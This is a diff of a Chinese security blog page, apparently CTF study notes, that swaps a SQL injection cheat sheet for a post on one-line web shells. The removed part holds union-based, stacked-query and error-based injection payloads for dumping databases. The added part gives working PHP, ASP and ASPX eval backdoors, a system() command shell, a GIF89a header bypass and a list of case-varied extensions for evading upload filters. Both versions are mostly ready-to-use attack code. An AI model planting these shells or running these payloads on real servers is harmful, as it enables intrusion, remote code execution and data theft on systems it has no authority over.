@@ -19,23 +19,23 @@
   <meta name="author" content="ccnyy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SQL注入攻击1. 注入点识别 POST请求：使用 # 注释符，最好用 %23 代替。 GET请求：使用 --+ 注释符。 ID错误：使用错误的ID以覆盖回显。  2. 确定列数使用以下语句通过判断有无报错来确定列数： 1231&#x27; order by 1#1&#x27; order by 2#1&#x27; order by 3#  3. 判断回显位使用以下语句判断回显位： 11&amp;#x27">
+    <meta name="description" content="一句话木马与文件头过滤一句话木马PHP 一句话木马1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  1&lt;?php eval($_POST[aaa]) ?&gt;  1&lt;?&#x3D;eval($_POST[&#x27;a&#x27;]);?&gt;  &#x2F;&#x2F; 短标签绕过 PHP  ASP 一句话木马1&lt;%eval request (&quot;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入攻击">
-<meta property="og:url" content="http://page.ccnyy.top/2025/01/21/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="一句话木马与文件头过滤">
+<meta property="og:url" content="http://page.ccnyy.top/2025/01/21/%E6%9C%A8%E9%A9%AC/index.html">
 <meta property="og:site_name" content="CNYのBlog">
-<meta property="og:description" content="SQL注入攻击1. 注入点识别 POST请求：使用 # 注释符，最好用 %23 代替。 GET请求：使用 --+ 注释符。 ID错误：使用错误的ID以覆盖回显。  2. 确定列数使用以下语句通过判断有无报错来确定列数： 1231&#x27; order by 1#1&#x27; order by 2#1&#x27; order by 3#  3. 判断回显位使用以下语句判断回显位： 11&amp;#x27">
+<meta property="og:description" content="一句话木马与文件头过滤一句话木马PHP 一句话木马1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  1&lt;?php eval($_POST[aaa]) ?&gt;  1&lt;?&#x3D;eval($_POST[&#x27;a&#x27;]);?&gt;  &#x2F;&#x2F; 短标签绕过 PHP  ASP 一句话木马1&lt;%eval request (&quot;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-21T15:19:05.000Z">
-<meta property="article:modified_time" content="2025-01-24T07:17:49.902Z">
+<meta property="article:modified_time" content="2025-01-24T07:25:07.982Z">
 <meta property="article:author" content="ccnyy">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="sql">
+<meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>SQL注入攻击 - CNYのBlog</title>
+  <title>一句话木马与文件头过滤 - CNYのBlog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SQL注入攻击"></span>
+            <span id="subtitle" data-typed-text="一句话木马与文件头过滤"></span>
           
         </div>
 
@@ -224,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          502 字
+          392 字
         
       </span>
     
@@ -235,7 +235,7 @@
         
         
         
-          5 分钟
+          4 分钟
         
       </span>
     
@@ -272,7 +272,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SQL注入攻击</h1>
+            <h1 id="seo-header">一句话木马与文件头过滤</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -285,55 +285,29 @@
             
               <div class="markdown-body">
                 
-                <h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h2 id="1-注入点识别"><a href="#1-注入点识别" class="headerlink" title="1. 注入点识别"></a>1. 注入点识别</h2><ul>
-<li><strong>POST请求</strong>：使用 <code>#</code> 注释符，最好用 <code>%23</code> 代替。</li>
-<li><strong>GET请求</strong>：使用 <code>--+</code> 注释符。</li>
-<li><strong>ID错误</strong>：使用错误的ID以覆盖回显。</li>
-</ul>
-<h2 id="2-确定列数"><a href="#2-确定列数" class="headerlink" title="2. 确定列数"></a>2. 确定列数</h2><p>使用以下语句通过判断有无报错来确定列数：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>#<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3#</span><br></code></pre></td></tr></table></figure>
+                <h1 id="一句话木马与文件头过滤"><a href="#一句话木马与文件头过滤" class="headerlink" title="一句话木马与文件头过滤"></a>一句话木马与文件头过滤</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="PHP-一句话木马"><a href="#PHP-一句话木马" class="headerlink" title="PHP 一句话木马"></a>PHP 一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="3-判断回显位"><a href="#3-判断回显位" class="headerlink" title="3. 判断回显位"></a>3. 判断回显位</h2><p>使用以下语句判断回显位：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3#</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[aaa]) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4. 获取数据库名"></a>4. 获取数据库名</h2><p>将 <code>database()</code> 放到回显位，其余位置用 <code>&#39;&#39;</code> 代替：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,database()#</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 短标签绕过 PHP</span><br></code></pre></td></tr></table></figure>
 
-<p>或</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,database()&#x27;</span><br></code></pre></td></tr></table></figure>
+<h3 id="ASP-一句话木马"><a href="#ASP-一句话木马" class="headerlink" title="ASP 一句话木马"></a>ASP 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request (&quot;pass&quot;)%&gt;<br></code></pre></td></tr></table></figure>
 
-<h2 id="5-获取数据表名"><a href="#5-获取数据表名" class="headerlink" title="5. 获取数据表名"></a>5. 获取数据表名</h2><p>使用以下语句获取数据库下的所有数据表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,table_name from information_schema.tables where table_schema=&#x27;</span>news<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
+<h3 id="ASPX-一句话木马"><a href="#ASPX-一句话木马" class="headerlink" title="ASPX 一句话木马"></a>ASPX 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure>
 
-<p>如果有多个数据表，使用 <code>group_concat(table_name)</code>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></code></pre></td></tr></table></figure>
+<h3 id="PHP-另一种形式"><a href="#PHP-另一种形式" class="headerlink" title="PHP 另一种形式"></a>PHP 另一种形式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mochu7&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
-<h2 id="6-获取字段名"><a href="#6-获取字段名" class="headerlink" title="6. 获取字段名"></a>6. 获取字段名</h2><p>使用以下语句获取某个表的所有字段名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>secret_table<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
+<h2 id="文件头过滤"><a href="#文件头过滤" class="headerlink" title="文件头过滤"></a>文件头过滤</h2><h3 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h3><p>在文件开头添加 <code>GIF89a</code> 可以绕过一些文件头检测。</p>
+<h2 id="可执行命令一句话"><a href="#可执行命令一句话" class="headerlink" title="可执行命令一句话"></a>可执行命令一句话</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>&lt;? @system($_GET[&quot;cc&quot;]); ?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="7-获取表内容"><a href="#7-获取表内容" class="headerlink" title="7. 获取表内容"></a>7. 获取表内容</h2><p>使用以下语句获取表内容：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table#</span><br></code></pre></td></tr></table></figure>
+<p>运行 HTML</p>
+<h2 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h2><p>以下是一些常见的文件后缀，可以用于绕过文件上传检测：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;.php&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;php1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.phtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pht&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;pHp1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ascx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ashx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aScx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aShx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cEr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.sWf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.swf&quot;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="8-使用-LIMIT-获取特定数据"><a href="#8-使用-LIMIT-获取特定数据" class="headerlink" title="8. 使用 LIMIT 获取特定数据"></a>8. 使用 <code>LIMIT</code> 获取特定数据</h2><p>使用 <code>LIMIT</code> 获取特定数据：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table limit 3,1#</span><br></code></pre></td></tr></table></figure>
+<h2 id="PHP-解析配置"><a href="#PHP-解析配置" class="headerlink" title="PHP 解析配置"></a>PHP 解析配置</h2><p>PHP 文件需要在 Apache 的 <code>httpd.conf</code> 中有如下配置代码，才能正确解析：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AddType</span> application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></table></figure>
 
-<h2 id="9-改名操作"><a href="#9-改名操作" class="headerlink" title="9. 改名操作"></a>9. 改名操作</h2><p>猜测回显的数据库表字段，改变表名使回显到 <code>flag</code> 字段：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;alter table words rename words1; alter table `1919810931114514` rename words; alter table words change flag id varchar(100);#</span><br></code></pre></td></tr></table></figure>
-
-<p>使用以下语句得到回显：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1;#</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="10-空格绕过"><a href="#10-空格绕过" class="headerlink" title="10. 空格绕过"></a>10. 空格绕过</h2><p>使用 <code>/**/</code> 代替空格或使用 <code>()</code>，<code>()</code> 两边不用空格：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
-
-<h2 id="11-报错注入"><a href="#11-报错注入" class="headerlink" title="11. 报错注入"></a>11. 报错注入</h2><h3 id="11-1-extractvalue-报错注入"><a href="#11-1-extractvalue-报错注入" class="headerlink" title="11.1 extractvalue() 报错注入"></a>11.1 <code>extractvalue()</code> 报错注入</h3><p><code>extractvalue()</code> 函数用于从XML文档中提取数据。通过构造错误的XPath表达式，可以触发报错并获取信息。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure>
-
-<h3 id="11-2-为什么使用-0x7e"><a href="#11-2-为什么使用-0x7e" class="headerlink" title="11.2 为什么使用 0x7e"></a>11.2 为什么使用 <code>0x7e</code></h3><p><code>0x7e</code> 是ASCII码中的 <code>~</code> 符号，XPath语法不支持该符号，因此总能触发报错。其他不支持的字符如 <code>!</code> 也可以使用。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure>
-
-<h3 id="11-3-其他报错注入方法"><a href="#11-3-其他报错注入方法" class="headerlink" title="11.3 其他报错注入方法"></a>11.3 其他报错注入方法</h3><p>使用其他不支持的字符也可以达到同样的效果：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-string">&#x27;!&#x27;</span>, database()));<br></code></pre></td></tr></table></figure>
+<p>如果没有配置，访问时将会显示空白页。</p>
 
                 
               </div>
@@ -348,7 +322,7 @@
       
         <a href="/tags/web/" class="print-no-link">#web</a>
       
-        <a href="/tags/sql/" class="print-no-link">#sql</a>
+        <a href="/tags/php/" class="print-no-link">#php</a>
       
     </div>
   
@@ -360,8 +334,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SQL注入攻击</div>
-      <div>http://page.ccnyy.top/2025/01/21/sql注入/</div>
+      <div>一句话木马与文件头过滤</div>
+      <div>http://page.ccnyy.top/2025/01/21/木马/</div>
     </div>
     <div class="license-meta">
       
@@ -410,9 +384,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/21/md5%E7%BB%95%E8%BF%87/" title="md5绕过">
+                      <a href="/2025/01/21/sql%E6%B3%A8%E5%85%A5/" title="SQL注入攻击">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">md5绕过</span>
+                        <span class="hidden-mobile">SQL注入攻击</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -420,8 +394,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/21/%E6%9C%A8%E9%A9%AC/" title="一句话木马与文件头过滤">
-                        <span class="hidden-mobile">一句话木马与文件头过滤</span>
+                      <a href="/2025/01/21/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
